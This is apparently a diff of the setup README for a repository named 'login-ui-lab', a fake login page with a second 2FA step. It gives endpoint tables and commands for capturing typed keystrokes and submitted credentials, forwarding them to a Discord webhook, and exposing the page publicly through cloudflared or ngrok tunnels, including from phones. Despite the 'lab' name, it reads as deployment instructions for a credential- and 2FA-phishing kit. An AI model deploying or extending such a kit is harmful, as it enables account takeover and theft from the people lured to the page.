@@ -1,52 +1,31 @@
 # Setup
 
+## Environment
+
+```bash
+export PORT=8080
+export DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN"  # optional
+node server.js
+```
+
+No secrets are stored in the repo. Webhook is env-only.
+
 ## Endpoints
 
-Edit top of `server.js` or env:
+| Path | Method | Purpose |
+|------|--------|--------|
+| `/` | GET | Login UI |
+| `/2fa.html` | GET | Confirmation step |
+| `/collect` | POST | JSON events |
+| `/list` | GET | Recent events (local) |
 
-```
-DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
-PORT=8080
-```
-
-Page posts to `/collect`. Live keystrokes and full submit both land there.
-
-## Termux
+## Tunnels
 
 ```bash
-pkg update && pkg install nodejs cloudflared git
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js &
 cloudflared tunnel --url http://127.0.0.1:8080
-```
-
-## iSH (iPhone)
-
-```bash
-apk add nodejs npm git
-git clone https://github.com/zenzemie/login-ui-lab.git
-cd login-ui-lab
-node server.js &
-# tunnel: install cloudflared binary or use ngrok / localhost.run from another device
-```
-
-iSH has limited background processes; keep the app open. For public links from iPhone, ngrok or a Worker is often easier than cloudflared.
-
-## ngrok
-
-```bash
-ngrok config add-authtoken YOUR_TOKEN
 ngrok http 8080
 ```
 
-## View captures
+## Mobile
 
-```bash
-curl http://127.0.0.1:8080/list
-# or check Discord channel
-```
-
-## 2FA stage
-
-After login the page can load `/2fa.html` instead of redirecting. Edit `index.html` redirect target.
+Termux and iSH both run `node server.js`. Prefer cloudflared on Termux; on iSH keep the session alive or host the tunnel elsewhere.
